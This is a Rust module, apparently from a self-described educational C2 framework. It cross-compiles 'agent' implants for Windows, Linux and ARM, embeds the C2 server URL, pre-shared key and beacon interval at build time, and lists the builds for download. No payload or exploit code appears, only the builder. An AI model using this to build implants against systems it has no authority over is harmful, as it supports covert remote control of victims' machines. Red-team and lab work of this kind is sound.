//! Educational agent build service — cross-compiles the agent crate with embedded config.
//!
//! Build strategy:
//!   1. "binary" target → plain `cargo build` (native host binary)
//!   2. Target matches host OS → plain `cargo build` (no cross needed)
//!   3. Cross-target on different OS → requires `cross` (Docker-based)
//!      Fails fast with an actionable error if `cross` is not installed.

use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::process::Stdio;
use tokio::process::Command;

use crate::db::{AgentBuild, Database};
use crate::logger::{log_info, log_warn};
use crate::websocket::ServerState;
use serde_json::Value;

const BUILDS_DIR: &str = "./builds";

#[derive(Deserialize)]
pub struct BuildRequest {
    pub target_os: String,
    pub server_url: String,
    pub psk: String,
    pub beacon_interval: u64,
}

#[derive(Serialize)]
pub struct BuildResponse {
    pub success: bool,
    pub build_id: String,
    pub status: String,
    pub message: String,
}

#[derive(Serialize)]
pub struct TargetInfo {
    pub target: &'static str,
    pub extension: &'static str,
}

/// Detect the host operating system at runtime.
/// Returns "windows", "linux", or "macos".
fn host_os() -> &'static str {
    if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "linux") {
        "linux"
    } else {
        "macos"
    }
}

/// Map dashboard OS selection to Rust cross-compilation target.
/// Linux uses musl for fully static, portable binaries that work on any distro.
pub fn resolve_target(target_os: &str) -> Result<TargetInfo, String> {
    match target_os.to_lowercase().as_str() {
        "windows" => Ok(TargetInfo {
            target: "x86_64-pc-windows-gnu",
            extension: ".exe",
        }),
        "linux" => Ok(TargetInfo {
            target: "x86_64-unknown-linux-musl",
            extension: "",
        }),
        "linux-arm64" => Ok(TargetInfo {
            target: "aarch64-unknown-linux-musl",
            extension: "",
        }),
        "linux-arm32" => Ok(TargetInfo {
            target: "armv7-unknown-linux-musleabihf",
            extension: "",
        }),
        // Bare-metal (unknown-none) requires no_std; use native host target for educational labs.
        "binary" => Ok(TargetInfo {
            target: "native",
            extension: ".bin",
        }),
        other => Err(format!("Unsupported target_os: {}", other)),
    }
}

/// Check whether building for `target_os` can use native `cargo` on this host.
/// For example, building "linux" on a Linux/Kali host doesn't need cross.
fn is_native_build(target_os: &str) -> bool {
    let host = host_os();
    let requested = target_os.to_lowercase();
    match requested.as_str() {
        "binary" => true, // always native
        "linux" => host == "linux" && cfg!(target_arch = "x86_64"),
        "linux-arm64" => host == "linux" && cfg!(target_arch = "aarch64"),
        "linux-arm32" => host == "linux" && cfg!(target_arch = "arm"),
        "windows" => host == "windows",
        "macos" => host == "macos",
        _ => false,
    }
}

/// Locate the Cargo workspace root by walking up from the current working directory.
/// Looks for a `Cargo.toml` that contains `[workspace]`.
/// Falls back to the current directory if none is found.
fn workspace_root() -> PathBuf {
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    let mut candidate = cwd.as_path();
    loop {
        let toml = candidate.join("Cargo.toml");
        if toml.exists() {
            if let Ok(contents) = std::fs::read_to_string(&toml) {
                if contents.contains("[workspace]") {
                    return candidate.to_path_buf();
                }
            }
        }
        match candidate.parent() {
            Some(parent) => candidate = parent,
            None => break,
        }
    }
    // Fallback: return current directory
    cwd
}

/// Start an async agent build and return immediately with build_id.
pub async fn start_build(
    state: &ServerState,
    req: BuildRequest,
) -> Result<BuildResponse, String> {
    log_info(
        &state.db,
        &state.tx,
        "Build",
        None,
        &format!("start_build called for target_os={}", req.target_os),
    );

    if req.server_url.trim().is_empty() {
        return Err("server_url is required".to_string());
    }
    if req.psk.trim().is_empty() {
        return Err("psk is required".to_string());
    }
    if req.beacon_interval < 5 || req.beacon_interval > 3600 {
        return Err("beacon_interval must be between 5 and 3600".to_string());
    }

    let target_info = resolve_target(&req.target_os)?;
    let build_id = uuid::Uuid::new_v4().to_string();
    let now = Utc::now().to_rfc3339();

    tokio::fs::create_dir_all(BUILDS_DIR)
        .await
        .map_err(|e| format!("Failed to create builds dir: {}", e))?;

    let output_name = format!("agent_{}{}", build_id, target_info.extension);
    let output_path = format!("{}/{}", BUILDS_DIR, output_name);

    let build_record = AgentBuild {
        id: build_id.clone(),
        target_os: req.target_os.clone(),
        server_url: req.server_url.clone(),
        psk: req.psk.clone(),
        beacon_interval: req.beacon_interval as i64,
        file_path: output_path.clone(),
        status: "building".to_string(),
        created_at: now,
    };

    state
        .db
        .insert_agent_build(&build_record)
        .map_err(|e| format!("DB error: {}", e))?;

    log_info(
        &state.db,
        &state.tx,
        "Build",
        None,
        &format!(
            "Started agent build {} for target {}",
            build_id, req.target_os
        ),
    );

    let _ = state.tx.send(serde_json::json!({
        "type": "BuildStatus",
        "payload": {
            "id": build_id,
            "status": "building",
            "target_os": req.target_os,
        }
    }));

    let state_clone = state.clone();
    let build_id_clone = build_id.clone();
    let target_os = req.target_os.clone();
    let server_url = req.server_url.clone();
    let psk = req.psk.clone();
    let beacon_interval = req.beacon_interval;
    let target = target_info.target.to_string();
    let extension = target_info.extension.to_string();

    tokio::spawn(async move {
        run_build(
            state_clone,
            build_id_clone,
            target_os,
            server_url,
            psk,
            beacon_interval,
            target,
            extension,
        )
        .await;
    });

    Ok(BuildResponse {
        success: true,
        build_id,
        status: "building".to_string(),
        message: "Build started".to_string(),
    })
}

/// Check whether the `cross` binary is available on PATH.
fn cross_available() -> bool {
    std::process::Command::new("cross")
        .arg("--version")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

/// Check whether Docker is running (required by `cross`).
fn docker_running() -> bool {
    std::process::Command::new("docker")
        .arg("info")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

async fn run_build(
    state: ServerState,
    build_id: String,
    target_os: String,
    server_url: String,
    psk: String,
    beacon_interval: u64,
    target: String,
    extension: String,
) {
    let root = workspace_root();
    let native = is_native_build(&target_os);

    // Decide build strategy:
    //   - "native" target or host OS matches → plain cargo (no --target for "binary",
    //     with --target for native OS match to get correct output path)
    //   - Cross-target → require `cross` + Docker, fail fast if unavailable
    let (tool, use_target_flag, use_cross) = if target == "native" {
        // "binary" option: always native cargo, no --target flag
        ("cargo".to_string(), false, false)
    } else if native {
        // Host OS matches requested target: use cargo with --target for correct output dir
        ("cargo".to_string(), true, false)
    } else {
        // Cross-compilation needed — verify dependencies before attempting build
        if !cross_available() {
            let msg = format!(
                "Cross-compilation to '{}' ({}) requires `cross` but it is not installed.\n\
                 \n\
                 Run the setup script to install all dependencies:\n\
                 \n\
                     ./scripts/setup-cross.sh\n\
                 \n\
                 This will install `cross`, Docker images, and Rust targets.\n\
                 Alternatively: cargo install cross --git https://github.com/cross-rs/cross",
                target_os, target,
            );
            fail_build(&state, &build_id, &msg).await;
            return;
        }
        if !docker_running() {
            let msg = format!(
                "Cross-compilation to '{}' ({}) requires Docker but it is not running.\n\
                 \n\
                 Start Docker and try again:\n\
                 \n\
                 macOS:  Open Docker Desktop\n\
                 Linux:  sudo systemctl start docker",
                target_os, target,
            );
            fail_build(&state, &build_id, &msg).await;
            return;
        }
        ("cross".to_string(), true, true)
    };

    log_info(
        &state.db,
        &state.tx,
        "Build",
        None,
        &format!(
            "run_build started: id={} target={} tool={} native={} workspace={:?}",
            build_id, target_os, tool, native, root
        ),
    );

    let output_name = format!("agent_{}{}", build_id, extension);
    let output_path = format!("{}/{}", BUILDS_DIR, output_name);

    let mut cmd = Command::new(&tool);
    cmd.current_dir(&root)
        .env("C2_BUILD_SERVER_URL", &server_url)
        .env("C2_BUILD_PSK", &psk)
        .env("C2_BUILD_BEACON_INTERVAL", beacon_interval.to_string())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    if use_target_flag {
        cmd.args(["build", "-p", "agent", "--release", "--target", &target]);
    } else {
        cmd.args(["build", "-p", "agent", "--release"]);
    }

    // When using `cross`, pass through env vars into the Docker container
    // so build.rs can embed them correctly. Cross.toml also declares these,
    // but the env var provides a belt-and-suspenders fallback.
    if use_cross {
        cmd.env(
            "CROSS_ENV",
            "C2_BUILD_SERVER_URL,C2_BUILD_PSK,C2_BUILD_BEACON_INTERVAL",
        );
    }

    let result = cmd.output().await;

    match result {
        Ok(output) if output.status.success() => {
            let src = if !use_target_flag {
                // Native build without --target: binary is in target/release/
                root.join("target/release/agent.exe")
                    .exists()
                    .then(|| root.join("target/release/agent.exe"))
                    .or_else(|| {
                        if root.join("target/release/agent").exists() {
                            Some(root.join("target/release/agent"))
                        } else {
                            None
                        }
                    })
            } else {
                // Targeted build: binary is in target/<triple>/release/
                let base = root.join(format!("target/{}/release/agent", target));
                let with_exe = base.with_extension("exe");
                if with_exe.exists() {
                    Some(with_exe)
                } else if base.exists() {
                    Some(base)
                } else {
                    None
                }
            };

            match src {
                Some(src_path) => {
                    if let Err(e) = tokio::fs::copy(&src_path, &output_path).await {
                        fail_build(&state, &build_id, &format!("Copy failed: {}", e)).await;
                        return;
                    }
                    let _ = state.db.update_agent_build_status(
                        &build_id,
                        "completed",
                        Some(&output_path),
                    );
                    log_info(
                        &state.db,
                        &state.tx,
                        "Build",
                        None,
                        &format!("Build {} completed: {}", build_id, output_path),
                    );
                    let _ = state.tx.send(serde_json::json!({
                        "type": "BuildStatus",
                        "payload": {
                            "id": build_id,
                            "status": "completed",
                            "target_os": target_os,
                            "file_path": output_path,
                        }
                    }));
                }
                None => {
                    fail_build(&state, &build_id, "Compiled binary not found").await;
                }
            }
        }
        Ok(output) => {
            let stderr = String::from_utf8_lossy(&output.stderr);
            let msg = if stderr.len() > 500 {
                format!("{}...", &stderr[..500])
            } else {
                stderr.to_string()
            };
            fail_build(&state, &build_id, &msg).await;
        }
        Err(e) => {
            fail_build(&state, &build_id, &format!("Build process error: {}", e)).await;
        }
    }
}

async fn fail_build(state: &ServerState, build_id: &str, reason: &str) {
    let _ = state
        .db
        .update_agent_build_status(build_id, "failed", None);
    log_warn(
        &state.db,
        &state.tx,
        "Build",
        None,
        &format!("Build {} failed: {}", build_id, reason),
    );
    let _ = state.tx.send(serde_json::json!({
        "type": "BuildStatus",
        "payload": {
            "id": build_id,
            "status": "failed",
            "error": reason,
        }
    }));
}

pub fn list_builds(db: &Database) -> Result<Vec<Value>, String> {
    let builds = db.get_agent_builds(50).map_err(|e| e.to_string())?;
    Ok(builds
        .into_iter()
        .map(|b| {
            serde_json::json!({
                "id": b.id,
                "target_os": b.target_os,
                "server_url": b.server_url,
                "beacon_interval": b.beacon_interval,
                "status": b.status,
                "created_at": b.created_at,
                "download_url": format!("/api/agents/download/{}", b.id),
            })
        })
        .collect())
}
